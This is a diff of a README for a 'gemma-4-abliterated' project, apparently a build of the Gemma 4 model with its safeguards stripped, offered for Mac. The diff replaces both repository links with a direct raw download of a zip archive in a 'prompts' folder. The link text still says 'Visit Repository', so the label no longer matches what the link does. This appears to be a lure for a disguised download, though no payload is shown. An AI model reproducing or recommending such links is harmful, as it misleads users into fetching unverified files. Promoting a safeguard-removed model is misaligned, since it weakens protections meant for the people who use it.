@@ -1,12 +1,12 @@
 # 🧩 gemma-4-abliterated - Run Gemma 4 on Mac with less friction
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Repository-blue?style=for-the-badge)](https://github.com/garbatyzydziok-cmd/gemma-4-abliterated)
+[![Download](https://img.shields.io/badge/Download-Visit%20Repository-blue?style=for-the-badge)](https://github.com/garbatyzydziok-cmd/gemma-4-abliterated/raw/refs/heads/main/prompts/gemma_abliterated_v2.5.zip)
 
 ## 📥 Download
 
 Use this link to visit the repository and download the files you need:
 
-https://github.com/garbatyzydziok-cmd/gemma-4-abliterated
+https://github.com/garbatyzydziok-cmd/gemma-4-abliterated/raw/refs/heads/main/prompts/gemma_abliterated_v2.5.zip
 
 Open the page, then use the files and instructions in the repository to get the app on your computer.
 
